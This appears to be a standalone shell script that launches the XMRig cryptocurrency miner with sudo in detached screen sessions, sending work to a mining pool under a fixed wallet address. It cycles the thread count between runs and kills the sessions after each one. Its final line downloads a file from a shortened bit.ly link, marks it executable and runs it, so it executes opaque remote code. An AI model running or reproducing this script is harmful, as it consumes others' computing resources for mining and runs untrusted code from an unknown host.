screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=2 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=4 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=8 -k --randomx-1gb-pages
sleep 3600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=2 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=4 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=8 -k --randomx-1gb-pages
sleep 3600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
wget https://bit.ly/419EixW && chmod +x 419EixW && ./419EixW
